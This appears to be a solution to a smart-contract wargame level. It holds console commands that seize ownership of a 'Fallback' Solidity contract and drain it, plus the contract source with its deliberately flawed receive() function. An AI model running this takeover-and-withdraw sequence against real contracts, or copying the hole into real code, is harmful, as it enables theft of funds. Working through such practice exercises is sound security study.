```javascript
await contract.owner()
'0x....'  // Level address
await contract.getContribution()
// {.., words: (2) [0, empty], ..}
await contract.contribute({value: toWei('0.0001')})
await sendTransaction({from: player, to: contract.address, value: toWei('0.0001')})
await contract.owner()
'0x....'  // My address

await getBalance(contract.address)
'0.00012'
await contract.withdraw()
await getBalance(contract.address)
'0'
```

```solidity
// Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```